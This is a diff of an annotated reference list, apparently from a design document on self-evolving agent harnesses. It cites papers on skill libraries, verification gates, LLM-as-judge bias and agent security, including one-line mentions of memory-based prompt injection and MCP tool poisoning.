-- Wang et al., *Voyager* (2023): a skill library as the evolving layer.
-- Zhang et al., *ACE: Agentic Context Engineering* (2025): context collapse
-  and brevity bias in evolved context.
-- Shinn et al., *Reflexion* (2023): verbal self-feedback, and how quickly it
-  becomes unreliable without an external signal.
-- Zheng et al., *Judging LLM-as-a-Judge* (2023): self-preference and
-  position bias.
-- Rehberger, *SpAIware* (2024): persistent prompt injection through
-  assistant memory.
-- Invariant Labs, *MCP tool poisoning / rug pull* (2025): why pinning
-  digests (as `trusted.json` does) is necessary but not sufficient.
-- Willison, *The lethal trifecta* (2025).
-- Starovoitov et al., *eBPF verifier* documentation: load-time verification
-  as the gate on runtime control flow.
-- OWASP, *Top 10 for LLM Applications*, LLM01 (prompt injection) and LLM06
-  (excessive agency).
+- Zhang, [*Self-Evolving Agentic Harnesses*](https://jxzhangjhu.github.io/blog/2026/self-evolving-agentic-harnesses/) (2026): overview of the field. "The gate, not the proposer, does the work"; AHE, SkillOpt, HarnessX results; Terminal-Bench model-vs-scaffold comparison.
+- [*Harness Updating Is Not Harness Benefit*](https://arxiv.org/html/2605.30621v1) (2026): the updating/benefit split; activation and adherence failures.
+- [*Self-Harness: Harnesses That Improve Themselves*](https://arxiv.org/html/2606.09498v1) (2026): held-in/held-out non-regression acceptance.
+- [*HarnessBank: Gated Verification for Harness Self-Evolution*](https://arxiv.org/pdf/2607.13683) (2026).
+- [*Verify Smarter, Evolve Further*](https://arxiv.org/pdf/2608.27311) (2026): behavior-aware verification cost.
+- [*SEAGym*](https://arxiv.org/pdf/2606.17546) (2026): evaluation environment for self-evolving agents.
+- Shao et al., [*Your Agent May Misevolve*](https://arxiv.org/abs/2509.26354) (2025): emergent risks across memory, tool and workflow evolution.
+- [*A Comprehensive Survey of Self-Evolving AI Agents*](https://arxiv.org/pdf/2508.07407) (2025) and [*A Survey of Self-Evolving Agents: What, When, How, Where*](https://arxiv.org/pdf/2507.21046) (2025).
+- Zhang et al., *Darwin Gödel Machine* (2025); Hu et al., *ADAS* (2024); Wang et al., *Voyager* (2023); Zhang et al., *ACE* (2025); Agrawal et al., *GEPA* (2025).
+- Zheng et al., *Judging LLM-as-a-Judge* (2023): self-preference bias.
+- Rehberger, *SpAIware* (2024); Invariant Labs, *MCP tool poisoning* (2025); Willison, *The lethal trifecta* (2025).
